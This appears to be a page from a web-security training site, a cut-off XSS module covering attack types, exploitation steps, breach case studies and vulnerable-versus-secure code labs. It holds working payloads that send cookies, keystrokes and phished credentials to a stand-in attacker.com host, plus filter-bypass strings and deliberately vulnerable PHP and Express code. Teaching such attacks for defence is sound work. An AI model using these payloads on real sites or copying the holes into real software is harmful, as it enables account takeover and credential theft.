<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
session_start();
$isLoggedIn = isset($_SESSION['user_id']);
$isStrictAuth = true;

$pageTitle = "Cross-Site Scripting (XSS) - Complete Guide | DarkHunter";
$currentPage = "xss-module";
?>
<!DOCTYPE html>
<html lang="en" dir="ltr">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description"
    content="Master Cross-Site Scripting (XSS) vulnerabilities - Understanding reflected, stored, and DOM-based attacks with modern exploitation techniques and defenses. Complete cybersecurity training module.">
  <title><?php echo $pageTitle; ?></title>

  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link
    href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" type="text/css" href="/DarkHunter/learningBugs/css/xss-info.css?v=1.1">


</head>

<body>
  <div class="grid-bg"></div>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Public/login-modal.php'; ?>
  <button class="mobile-menu-btn" onclick="toggleSidebar()">☰</button>

  <div class="app-container">
    <a href="/DarkHunter/Public/Learning.php" class="modern-back-btn">
      <i>←</i>
      <span>Back to Modules</span>
    </a>

    <aside class="sidebar">
      <div class="sidebar-header">
        <div class="sidebar-brand">
          👾 <span>DARK</span>HUNTER
        </div>
      </div>

      <div class="nav-section">
        <div class="nav-title">Navigation</div>
        <ul class="nav-links">
          <li><a href="#overview" class="active"><i>📚</i> Overview</a></li>
          <li><a href="#mechanism"><i>⚙️</i> How It Works</a></li>
          <li><a href="#exploitation"><i>🎯</i> Exploitation Steps</a></li>
          <li><a href="#impact"><i>💥</i> Real-World Impact</a></li>
          <li><a href="#labs"><i>💻</i> Code Labs</a></li>
          <li><a href="#bypass"><i>🚧</i> Bypass Techniques</a></li>
          <li><a href="#mitigation"><i>🛡️</i> Prevention</a></li>
        </ul>
      </div>

      <div class="nav-section">
        <div class="nav-title">Related Modules</div>
        <ul class="nav-links">
          <li><a href="/DarkHunter/learningBugs/sqli-info.php"><i>🗃️</i> SQL Injection</a></li>
          <li><a href="/DarkHunter/learningBugs/csrf-info.php"><i>🧬</i> CSRF</a></li>
          <li><a href="/DarkHunter/learningBugs/idor-info.php"><i>🆔</i> IDOR</a></li>
          <li><a href="/DarkHunter/learningBugs/jwt-info.php"><i>🎫</i> JWT</a></li>
          <li><a href="/DarkHunter/learningBugs/ssti-info.php"><i>🧪</i> SSTI</a></li>
          <li><a href="/DarkHunter/learningBugs/cors-info.php"><i>🔗</i> CORS</a></li>
          <li><a href="/DarkHunter/learningBugs/file-upload-info.php"><i>📤</i> File Upload</a></li>
          <li><a href="/DarkHunter/learningBugs/cache-poisoning-info.php"><i>🧃</i> Cache Poisoning</a></li>
          <li><a href="/DarkHunter/learningBugs/host-header-info.php"><i>🖥️</i> Host Header Injection</a></li>
          <li><a href="/DarkHunter/learningBugs/oauth-info.php"><i>🔑</i> OAUTH</a></li>
          <li><a href="/DarkHunter/learningBugs/http-smuggling-info.php"><i>📦</i> HTTP Smuggling</a></li>
          <li><a href="/DarkHunter/learningBugs/html-injection-info.php"><i>📝</i> HTML Injection</a></li>
          <li><a href="/DarkHunter/learningBugs/lfi-info.php"><i>📁</i> LFI</a></li>
          <li><a href="/DarkHunter/learningBugs/open-redirect-info.php"><i>↪️</i> Open Redirect</a></li>
          <li><a href="/DarkHunter/learningBugs/rce-info.php"><i>💻</i> RCE</a></li>
          <li><a href="/DarkHunter/learningBugs/ssrf-info.php"><i>🌐</i> SSRF</a></li>
          <li><a href="/DarkHunter/learningBugs/race-condition-info.php"><i>⚡</i> Race Condition</a></li>
        </ul>
      </div>
    </aside>

    <main class="main-content">
      <div class="page-header">
        <h1 class="page-title">Cross-Site Scripting (XSS)</h1>
        <p class="page-subtitle">
          Master Cross-Site Scripting vulnerabilities - Learn how attackers inject malicious scripts into web pages,
          from basic reflected XSS to advanced DOM-based attacks. Understand modern exploitation techniques and defense
          strategies including Content Security Policy.
        </p>
      </div>

      <div class="content-card">
        <div class="toc">
          <div class="toc-title">📋 Table of Contents</div>
          <ul class="toc-list">
            <li><a href="#overview">1. What is XSS?</a></li>
            <li><a href="#mechanism">2. Technical Mechanism</a></li>
            <li><a href="#exploitation">3. Exploitation Steps</a></li>
            <li><a href="#impact">4. Real-World Impact</a></li>
            <li><a href="#labs">5. Code Labs: Vulnerable vs Secure</a></li>
            <li><a href="#bypass">6. Bypass Techniques</a></li>
            <li><a href="#mitigation">7. Prevention Checklist</a></li>
          </ul>
        </div>
      </div>

      <div id="overview" class="content-card">
        <h2 class="card-title"><i>📚</i> What is Cross-Site Scripting (XSS)?</h2>

        <div class="highlight-box">
          <strong>Definition:</strong> Cross-Site Scripting (XSS) is a client-side code injection attack where an
          attacker injects malicious scripts into web pages viewed by other users. Unlike SQL Injection that targets the
          database, XSS targets the users of the application by exploiting the trust relationship between a user and a
          website.
        </div>

        <p class="text-content">
          XSS exploits the browser's Same-Origin Policy (SOP) trust model. When a user visits a trusted site, their
          browser executes all code from that site within the security context of that site. If an attacker can inject
          malicious JavaScript into that page, the browser will execute it with the same privileges as legitimate site
          code, allowing theft of cookies, session hijacking, and account takeover.
        </p>

        <div class="danger-box">
          <strong>⚠️ Critical Impact:</strong> XSS can lead to session hijacking, credential theft, keylogging,
          cryptocurrency mining (cryptojacking), phishing attacks, and complete account takeover. Disclosed XSS
          vulnerabilities increased by 68% in 2024 compared to 2023 [^36^], with 81% of flaws rated Medium severity. It
          consistently ranks in the OWASP Top 10 vulnerabilities.
        </div>

        <h3 class="subsection-title">CVSS Severity Assessment</h3>
        <div class="highlight-box">
          <strong>CVSS Score Range: 6.1 - 8.5 (Medium to High)</strong>
          <ul style="margin-left: 2rem; margin-top: 0.5rem;">
            <li><strong>Attack Vector:</strong> Network (remotely exploitable)</li>
            <li><strong>Attack Complexity:</strong> Low to Medium</li>
            <li><strong>Privileges Required:</strong> None (often unauthenticated)</li>
            <li><strong>User Interaction:</strong> Required (victim must visit malicious link/page)</li>
            <li><strong>Scope:</strong> Changed (can affect browser beyond vulnerable component)</li>
            <li><strong>Impact:</strong> High on Confidentiality and Integrity</li>
          </ul>
        </div>

        <h3 class="subsection-title">Types of XSS</h3>
        <p class="text-content">
          XSS manifests in three primary forms, each with different attack vectors and persistence characteristics
          [^28^]:
        </p>

        <div class="highlight-box">
          <table style="width: 100%; border-collapse: collapse; margin-top: 1rem;">
            <tr style="border-bottom: 1px solid var(--border-color);">
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-green);">Type</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-purple);">Description</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--danger);">Impact</th>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Stored XSS</td>
              <td style="padding: 0.75rem;">Malicious script permanently stored on server (database)</td>
              <td style="padding: 0.75rem;">Affects all users viewing infected page</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Reflected XSS</td>
              <td style="padding: 0.75rem;">Script reflected off server in immediate response</td>
              <td style="padding: 0.75rem;">Requires victim to click malicious link</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">DOM-based XSS</td>
              <td style="padding: 0.75rem;">Vulnerability exists in client-side code only</td>
              <td style="padding: 0.75rem;">Server never sees the payload</td>
            </tr>
            <tr>
              <td style="padding: 0.75rem;">Mutation XSS</td>
              <td style="padding: 0.75rem;">Browser mutates "safe" code into executable during parsing</td>
              <td style="padding: 0.75rem;">Bypasses filters, exploits browser quirks</td>
            </tr>
          </table>
        </div>

        <div class="diagram-container">
          <div class="diagram-label">📊 XSS Attack Architecture</div>
          <div class="diagram-placeholder">
            <i>🖼️</i><br>
            [Insert Diagram: Attacker → Injection → Web Server → Victim Browser → Malicious Execution]
          </div>
        </div>
      </div>

      <div id="mechanism" class="content-card">
        <h2 class="card-title"><i>⚙️</i> How XSS Works: Technical Deep Dive</h2>

        <h3 class="subsection-title">The Trust Model Exploitation</h3>
        <p class="text-content">
          Browsers implement the Same-Origin Policy (SOP) to prevent scripts from one origin accessing data from
          another. However, XSS bypasses this by making the malicious script appear to originate from the trusted site
          itself. When XSS executes, it runs with the full privileges of the vulnerable website [^28^].
        </p>

        <div class="highlight-box">
          <strong>Execution Context Privileges:</strong>
          <ul style="margin-left: 2rem; margin-top: 0.5rem;">
            <li>Access cookies (if not HttpOnly): <code class="font-mono">document.cookie</code></li>
            <li>Read localStorage/SessionStorage</li>
            <li>Perform actions on behalf of the user (clicking buttons, submitting forms)</li>
            <li>Modify the DOM to show fake content (defacement)</li>
            <li>Make requests to the server with user's credentials</li>
            <li>Keylogging and credential theft via fake login forms</li>
          </ul>
        </div>

        <h3 class="subsection-title">Common XSS Entry Points</h3>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Common Vulnerable Patterns</span></div>
          <pre><code><span class="code-comment">-- URL Parameters (Reflected XSS)</span>
<span class="code-string">GET /search?q=&lt;script&gt;alert(1)&lt;/script&gt;</span>

<span class="code-comment">-- Form Inputs (Stored XSS)</span>
<span class="code-string">POST /comment</span>
{ <span class="code-attr">"content"</span>: <span class="code-string">"&lt;img src=x onerror=fetch('https://attacker.com/steal?c='+document.cookie)&gt;"</span> }

<span class="code-comment">-- HTTP Headers (Reflected XSS via Referer/User-Agent)</span>
<span class="code-string">User-Agent: &lt;script&gt;alert(1)&lt;/script&gt;</span>

<span class="code-comment">-- DOM Sinks (DOM-based XSS)</span>
<span class="code-string">#&lt;img src=x onerror=alert(1)&gt;</span>  <span class="code-comment">-- Hash fragment processed by JavaScript</span>

<span class="code-comment">-- File Uploads (SVG with embedded JavaScript)</span>
<span class="code-string">image.svg</span> containing: <span class="code-tag">&lt;svg&gt;&lt;script&gt;</span>alert(1)<span class="code-tag">&lt;/script&gt;&lt;/svg&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">The XSS Execution Lifecycle</h3>
        <p class="text-content">
          Understanding how browsers parse and execute content is crucial for both exploitation and defense. The
          browser's parsing engine can normalize malformed HTML, CSS, and JavaScript, which attackers exploit to slip
          malicious code past filters [^34^].
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Browser Parsing Discrepancies</span></div>
          <pre><code><span class="code-comment">-- HTML entity encoding bypass</span>
<span class="code-string">&lt;img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&gt;</span>  <span class="code-comment">-- Hex entities</span>

<span class="code-comment">-- JavaScript template literals</span>
<span class="code-string">${alert(1)}</span>  <span class="code-comment">-- In JS template literal context</span>

<span class="code-comment">-- SVG foreignObject bypass</span>
<span class="code-tag">&lt;svg&gt;&lt;foreignObject&gt;&lt;script&gt;</span>alert(1)<span class="code-tag">&lt;/script&gt;&lt;/foreignObject&gt;&lt;/svg&gt;</span>

<span class="code-comment">-- MathML mtext parsing quirks</span>
<span class="code-tag">&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;img src=x onerror=alert(1)&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">DOM-Based XSS Sinks and Sources</h3>
        <p class="text-content">
          DOM-based XSS occurs entirely in the browser when JavaScript takes user-controlled data (source) and passes it
          to a dangerous function (sink) without sanitization.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Dangerous Sinks to Avoid</span></div>
          <pre><code><span class="code-comment">-- High-risk sinks (never use with user input):</span>
<span class="code-attr">element.innerHTML</span> = userInput;        <span class="code-comment">-- Parses and executes HTML/JS</span>
<span class="code-function">document.write</span>(userInput);            <span class="code-comment">-- Writes to document stream</span>
<span class="code-function">eval</span>(userInput);                      <span class="code-comment">-- Executes arbitrary JavaScript</span>
<span class="code-function">setTimeout</span>(userInput, <span class="code-keyword">100</span>);           <span class="code-comment">-- Executes string as code</span>
<span class="code-function">setInterval</span>(userInput, <span class="code-keyword">100</span>);          <span class="code-comment">-- Same as setTimeout</span>

<span class="code-comment">-- Medium-risk sinks (context-dependent):</span>
<span class="code-attr">location.href</span> = userInput;            <span class="code-comment">-- Can cause javascript: execution</span>
<span class="code-attr">window.open</span>(userInput);               <span class="code-comment">-- Same href risk</span>
<span class="code-function">postMessage</span>(data, userInput);         <span class="code-comment">-- Target origin control</span></code></pre>
        </div>

        <div class="attack-flow">
          <div class="flow-step">
            <div class="flow-icon attack">🎯</div>
            <div class="flow-label">Find Input Vector</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">URL params, forms, headers</p>
          </div>
          <div class="flow-step">
            <div class="flow-icon server">💉</div>
            <div class="flow-label">Inject Payload</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Craft malicious script</p>
          </div>
          <div class="flow-step">
            <div class="flow-icon victim">🌐</div>
            <div class="flow-label">Victim Access</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Visit infected page/link</p>
          </div>
          <div class="flow-step">
            <div class="flow-icon attack">🔑</div>
            <div class="flow-label">Script Executes</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">In browser context</p>
          </div>
          <div class="flow-step">
            <div class="flow-icon server">💀</div>
            <div class="flow-label">Data Exfiltration</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Cookies, credentials stolen</p>
          </div>
        </div>
      </div>

      <div id="exploitation" class="content-card">
        <h2 class="card-title"><i>🎯</i> Exploitation Steps: Finding and Exploiting XSS</h2>

        <h3 class="subsection-title">Step 1: Identify Input Vectors</h3>
        <p class="text-content">
          Map all application entry points where user input is reflected back to the browser. Look for parameters that
          accept arbitrary text and display it without proper encoding.
        </p>

        <div class="highlight-box">
          <strong>High-Value Targets for XSS Testing:</strong>
          <ul style="margin-left: 2rem;">
            <li><strong>Search boxes:</strong> <code>?q=test</code> - Classic reflected XSS target</li>
            <li><strong>Error messages:</strong> Custom 404/500 pages that reflect the requested URL</li>
            <li><strong>User profiles:</strong> Display names, bios, status messages (stored XSS)</li>
            <li><strong>Comment systems:</strong> Blog comments, reviews, forum posts</li>
            <li><strong>File uploads:</strong> SVG, HTML files that execute when viewed</li>
            <li><strong>URL hash fragments:</strong> Processed by JavaScript routing (DOM XSS)</li>
            <li><strong>JSON/XML endpoints:</strong> If reflected without Content-Type headers</li>
          </ul>
        </div>

        <h3 class="subsection-title">Step 2: Test for Reflection</h3>
        <p class="text-content">
          Determine if user input is reflected in the response and identify the context (HTML, JavaScript, URL, CSS)
          where it appears.
        </p>

        <div class="code-block">
          <div class="code-header"><span class="code-label">XSS Detection Payloads</span></div>
          <pre><code><span class="code-comment">-- Basic HTML context test</span>
<span class="code-string">&lt;script&gt;alert(1)&lt;/script&gt;</span>
<span class="code-string">&lt;img src=x onerror=alert(1)&gt;</span>
<span class="code-string">&lt;svg onload=alert(1)&gt;</span>

<span class="code-comment">-- JavaScript context test</span>
<span class="code-string">';alert(1);//</span>           <span class="code-comment">-- Break out of string</span>
<span class="code-string">-alert(1)-</span>              <span class="code-comment">-- Expression context</span>
<span class="code-string">${alert(1)}</span>            <span class="code-comment">-- Template literal context</span>

<span class="code-comment">-- Attribute context test</span>
<span class="code-string">" onmouseover="alert(1)</span>
<span class="code-string">' onfocus='alert(1) autofocus</span>
<span class="code-string">&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span>

<span class="code-comment">-- URL context test</span>
<span class="code-string">javascript:alert(1)</span>
<span class="code-string">data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Step 3: Context Analysis</h3>
        <p class="text-content">
          Understanding the exact context where your payload lands is critical for successful exploitation. Different
          contexts require different encoding bypasses.
        </p>

        <div class="code-block">
          <div class="code-header"><span class="code-label">Context-Specific Payloads</span></div>
          <pre><code><span class="code-comment">-- HTML Body Context</span>
<span class="code-tag">&lt;div&gt;</span>USER_INPUT<span class="code-tag">&lt;/div&gt;</span>
<span class="code-comment">-- Payload: &lt;img src=x onerror=alert(1)&gt;</span>

<span class="code-comment">-- HTML Attribute Context (double quoted)</span>
<span class="code-tag">&lt;input value="USER_INPUT"&gt;</span>
<span class="code-comment">-- Payload: " onfocus="alert(1)" autofocus="</span>

<span class="code-comment">-- JavaScript String Context</span>
<span class="code-tag">&lt;script&gt;</span>
    <span class="code-keyword">var</span> name = <span class="code-string">"USER_INPUT"</span>;
<span class="code-tag">&lt;/script&gt;</span>
<span class="code-comment">-- Payload: ";alert(1);//</span>

<span class="code-comment">-- JavaScript Template Literal</span>
<span class="code-tag">&lt;script&gt;</span>
    <span class="code-keyword">var</span> msg = <span class="code-string">`Hello ${USER_INPUT}`</span>;
<span class="code-tag">&lt;/script&gt;</span>
<span class="code-comment">-- Payload: ${alert(1)}</span>

<span class="code-comment">-- URL Context (href/src)</span>
<span class="code-tag">&lt;a href="USER_INPUT"&gt;Click&lt;/a&gt;</span>
<span class="code-comment">-- Payload: javascript:alert(1)</span></code></pre>
        </div>

        <h3 class="subsection-title">Step 4: Weaponize the Payload</h3>
        <p class="text-content">
          Move beyond proof-of-concept alerts to functional exploits that steal data or perform actions.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Session Hijacking Payload</span></div>
          <pre><code><span class="code-tag">&lt;script&gt;</span>
<span class="code-function">fetch</span>(<span class="code-string">'https://attacker.com/steal?cookie='</span> + <span class="code-function">encodeURIComponent</span>(<span class="code-attr">document.cookie</span>));
<span class="code-tag">&lt;/script&gt;</span>

<span class="code-comment">-- Alternative using image request (no CORS issues)</span>
<span class="code-tag">&lt;img</span> <span class="code-attr">src</span>=<span class="code-string">"x"</span> <span class="code-attr">onerror</span>=<span class="code-string">"this.src='https://attacker.com/steal?c='+document.cookie"</span><span class="code-tag">&gt;</span></code></pre>
        </div>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Keylogging Payload</span></div>
          <pre><code><span class="code-tag">&lt;script&gt;</span>
<span class="code-attr">document.onkeypress</span> = <span class="code-keyword">function</span>(e) {
    <span class="code-function">fetch</span>(<span class="code-string">'https://attacker.com/keylog?k='</span> + e.<span class="code-attr">key</span> + <span class="code-string">'&page='</span> + <span class="code-attr">location.href</span>);
};
<span class="code-tag">&lt;/script&gt;</span></code></pre>
        </div>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Phishing Form Replacement</span></div>
          <pre><code><span class="code-tag">&lt;script&gt;</span>
<span class="code-attr">document.body.innerHTML</span> = <span class="code-string">`
    &lt;div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;"&gt;
        &lt;div style="width:300px;margin:100px auto;padding:20px;border:1px solid #ccc;"&gt;
            &lt;h2&gt;Session Expired&lt;/h2&gt;
            &lt;p&gt;Please login again:&lt;/p&gt;
            &lt;input type="text" id="u" placeholder="Username"&gt;
            &lt;input type="password" id="p" placeholder="Password"&gt;
            &lt;button onclick="fetch('https://attacker.com/creds?u='+document.getElementById('u').value+'&p='+document.getElementById('p').value)"&gt;Login&lt;/button&gt;
        &lt;/div&gt;
    &lt;/div&gt;
`</span>;
<span class="code-tag">&lt;/script&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Step 5: Automated Testing with Tools</h3>

        <div class="code-block">
          <div class="code-header"><span class="code-label">Burp Suite XSS Scanner</span></div>
          <pre><code><span class="code-comment">-- 1. Proxy traffic through Burp</span>
<span class="code-comment">-- 2. Send request to Repeater</span>
<span class="code-comment">-- 3. Right-click → Scan → Active Scan</span>
<span class="code-comment">-- 4. Enable "XSS Injection" checks</span>
<span class="code-comment">-- 5. Review findings in Target → Site Map</span>

<span class="code-comment">-- Manual testing with Intruder:</span>
<span class="code-comment">-- Payload set: XSS Polyglot list</span>
<span class="code-comment">-- Grep match: alert, prompt, confirm</span></code></pre>
        </div>

        <div class="code-block">
          <div class="code-header"><span class="code-label">XSS Hunter / Blind XSS</span></div>
          <pre><code><span class="code-comment">-- For blind XSS (payload executes in admin panels, etc.)</span>
<span class="code-tag">&lt;script src="https://xsshunter.example.com/your-unique-id"&gt;&lt;/script&gt;</span>

<span class="code-comment">-- Features:</span>
<span class="code-comment">-- - Screenshots of the vulnerable page</span>
<span class="code-comment">-- - Full DOM capture</span>
<span class="code-comment">-- - Cookies and localStorage exfiltration</span>
<span class="code-comment">-- - Page metadata (URL, referrer, User-Agent)</span></code></pre>
        </div>

        <div class="diagram-container">
          <div class="diagram-label">🎬 Video: XSS Exploitation with Burp Suite</div>
          <div class="video-placeholder">
            <i>▶️</i><br>
            [Insert Video: Step-by-step XSS exploitation from detection to account takeover]
          </div>
        </div>
      </div>

      <div id="impact" class="content-card">
        <h2 class="card-title"><i>💥</i> Real-World Impact: Notorious XSS Breaches</h2>

        <h3 class="subsection-title">Case Study 1: British Airways Magecart Attack (2018)</h3>
        <p class="text-content">
          The Magecart hacking group exploited an XSS vulnerability in a JavaScript library called Feedify used on the
          British Airways website. Attackers modified the script to send customer payment data to a malicious server
          with a domain name similar to British Airways [^27^].
        </p>
        <div class="danger-box">
          <strong>Impact:</strong> Credit card skimming on 380,000 booking transactions. The fake server had an SSL
          certificate, so users believed they were purchasing from a secure server. This demonstrated how XSS can be
          combined with supply chain attacks for massive financial theft.
        </div>

        <h3 class="subsection-title">Case Study 2: Fortnite XSS (2019)</h3>
        <p class="text-content">
          A retired, unsecured page in the popular multiplayer game Fortnite (200+ million users) contained an XSS
          vulnerability. Check Point researchers discovered that attackers could combine XSS with an insecure single
          sign-on (SSO) vulnerability to redirect users to fake login pages [^27^] [^38^].
        </p>
        <div class="warning-box">
          <strong>Attack Chain:</strong> XSS on unsecured page → SSO vulnerability exploitation → Fake login page →
          Virtual currency theft + recording player conversations for future attacks. The vulnerability was patched
          before mass exploitation.
        </div>

        <h3 class="subsection-title">Case Study 3: MySpace "Samy" Worm (2005)</h3>
        <p class="text-content">
          Security researcher Samy Kamkar created an XSS worm that spread across MySpace. The payload was injected into
          his profile and executed when other users viewed it, adding them as friends and copying the worm to their
          profiles [^33^].
        </p>
        <div class="danger-box">
          <strong>Impact:</strong> Infected over 1 million profiles within hours, causing MySpace to temporarily shut
          down. This remains one of the most famous examples of how XSS can be weaponized into self-propagating worms.
        </div>

        <h3 class="subsection-title">Case Study 4: eBay XSS (2015-2017)</h3>
        <p class="text-content">
          eBay had a severe XSS vulnerability in a "url" parameter used for redirects. The value was not validated,
          allowing attackers to inject malicious code. This enabled attackers to gain full access to eBay seller
          accounts and manipulate listings [^27^].
        </p>
        <div class="highlight-box">
          <strong>Impact:</strong> Attackers manipulated high-value product listings (vehicles) at discounted prices,
          stole payment details. The vulnerability was actively exploited from 2015 through 2017 with follow-on attacks
          continuing even after initial patches.
        </div>

        <h3 class="subsection-title">Common Attack Scenarios by Industry</h3>

        <div class="highlight-box">
          <table style="width: 100%; border-collapse: collapse;">
            <tr style="border-bottom: 1px solid var(--border-color);">
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-green);">Industry</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-purple);">XSS Attack Scenario</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--danger);">Potential Damage</th>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">E-Commerce</td>
              <td style="padding: 0.75rem;">Payment form skimming (Magecart-style)</td>
              <td style="padding: 0.75rem;">Credit card theft, PCI-DSS violations</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Social Media</td>
              <td style="padding: 0.75rem;">Self-propagating XSS worms</td>
              <td style="padding: 0.75rem;">Mass account compromise, data harvesting</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Banking</td>
              <td style="padding: 0.75rem;">Login page defacement for credential theft</td>
              <td style="padding: 0.75rem;">Financial fraud, account takeover</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">SaaS/Enterprise</td>
              <td style="padding: 0.75rem;">Stored XSS in document collaboration</td>
              <td style="padding: 0.75rem;">Corporate espionage, data exfiltration</td>
            </tr>
            <tr>
              <td style="padding: 0.75rem;">Gaming</td>
              <td style="padding: 0.75rem;">Virtual currency theft via session hijacking</td>
              <td style="padding: 0.75rem;">In-game economy disruption, user attrition</td>
            </tr>
          </table>
        </div>
      </div>

      <div id="labs" class="content-card">
        <h2 class="card-title"><i>💻</i> Code Labs: Vulnerable vs Secure Implementation</h2>

        <div class="warning-box">
          <strong>🎯 Lab Objective:</strong> Understand how improper output encoding enables XSS attacks, then implement
          context-aware encoding, Content Security Policy, and secure coding patterns to eliminate injection
          vulnerabilities.
        </div>

        <h3 class="subsection-title">Lab 1: Reflected XSS in Search Function</h3>
        <p class="text-content">
          <strong>Vulnerability:</strong> Direct output of user input without HTML encoding.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header">
            <span class="code-label">❌ Vulnerable PHP Code</span>
            <div class="code-actions">
              <button class="code-btn" onclick="copyCode(this)">📋 Copy</button>
            </div>
          </div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-comment">// Vulnerable: Direct output of user input</span>
<span class="code-keyword">$search</span> = <span class="code-keyword">$_GET</span>[<span class="code-string">'q'</span>];
<span class="code-keyword">echo</span> <span class="code-string">"&lt;h2&gt;Search results for: $search&lt;/h2&gt;"</span>;  <span class="code-comment">// XSS vulnerability!</span>

<span class="code-comment">// Attacker can use:</span>
<span class="code-comment">// ?q=&lt;script&gt;fetch('https://attacker.com/steal?c='+document.cookie)&lt;/script&gt;</span>
<span class="code-comment">// ?q=&lt;img src=x onerror=alert(document.domain)&gt;</span>
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <div class="code-block code-secure">
          <div class="code-header">
            <span class="code-label">✅ Secure Implementation</span>
            <div class="code-actions">
              <button class="code-btn" onclick="copyCode(this)">📋 Copy</button>
            </div>
          </div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-comment">// Secure: HTML encode all output</span>
<span class="code-keyword">$search</span> = <span class="code-keyword">$_GET</span>[<span class="code-string">'q'</span>];
<span class="code-keyword">$safe_search</span> = <span class="code-function">htmlspecialchars</span>(<span class="code-keyword">$search</span>, <span class="code-keyword">ENT_QUOTES</span>, <span class="code-string">'UTF-8'</span>);
<span class="code-keyword">echo</span> <span class="code-string">"&lt;h2&gt;Search results for: "</span> . <span class="code-keyword">$safe_search</span> . <span class="code-string">"&lt;/h2&gt;"</span>;

<span class="code-comment">// Alternative: Use a template engine with auto-escaping</span>
<span class="code-comment">// Twig, Blade, or similar with {{ variable }} syntax</span>

<span class="code-comment">// For JSON output (AJAX endpoints):</span>
<span class="code-keyword">header</span>(<span class="code-string">'Content-Type: application/json'</span>);
<span class="code-keyword">echo</span> <span class="code-function">json_encode</span>([<span class="code-string">'query'</span> => <span class="code-keyword">$search</span>]);  <span class="code-comment">// Safe - proper JSON encoding</span>
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Lab 2: Stored XSS in Comment System</h3>
        <p class="text-content">
          <strong>Vulnerability:</strong> Storing raw HTML in database and displaying without escaping.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">❌ Vulnerable Node.js/Express</span></div>
          <pre><code><span class="code-comment">// Vulnerable: Storing and displaying raw user input</span>
<span class="code-keyword">app.post</span>(<span class="code-string">'/comment'</span>, <span class="code-keyword">async</span> (req, res) => {
    <span class="code-keyword">const</span> { content } = req.body;
    <span class="code-keyword">await</span> db.<span class="code-function">query</span>(<span class="code-string">'INSERT INTO comments (content) VALUES (?)'</span>, [content]);
    res.<span class="code-function">redirect</span>(<span class="code-string">'/comments'</span>);
});

<span class="code-comment">// Display - DANGEROUS!</span>
<span class="code-keyword">app.get</span>(<span class="code-string">'/comments'</span>, <span class="code-keyword">async</span> (req, res) => {
    <span class="code-keyword">const</span> comments = <span class="code-keyword">await</span> db.<span class="code-function">query</span>(<span class="code-string">'SELECT * FROM comments'</span>);
    <span class="code-keyword">let</span> html = <span class="code-string">'&lt;ul&gt;'</span>;
    comments.<span class="code-function">forEach</span>(c => {
        html += <span class="code-string">`&lt;li&gt;${c.content}&lt;/li&gt;`</span>;  <span class="code-comment">// XSS vulnerability!</span>
    });
    res.<span class="code-function">send</span>(html + <span class="code-string">'&lt;/ul&gt;'</span>);
});</code></pre>
        </div>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">✅ Secure Implementation</span></div>
          <pre><code><span class="code-comment">// Secure: Using template engine with auto-escaping</span>
<span class="code-comment">// EJS with &lt;%= %&gt; (escaped) instead of &lt;%- %&gt; (unescaped)</span>

<span class="code-keyword">app.get</span>(<span class="code-string">'/comments'</span>, <span class="code-keyword">async</span> (req, res) => {
    <span class="code-keyword">const</span> comments = <span class="code-keyword">await</span> db.<span class="code-function">query</span>(<span class="code-string">'SELECT * FROM comments'</span>);
    res.<span class="code-function">render</span>(<span class="code-string">'comments'</span>, { comments });  <span class="code-comment">// Template handles escaping</span>
});

<span class="code-comment">// EJS Template (comments.ejs):</span>
<span class="code-tag">&lt;ul&gt;</span>
  <span class="code-tag">&lt;%</span> comments.forEach(function(c) { <span class="code-tag">%&gt;</span>
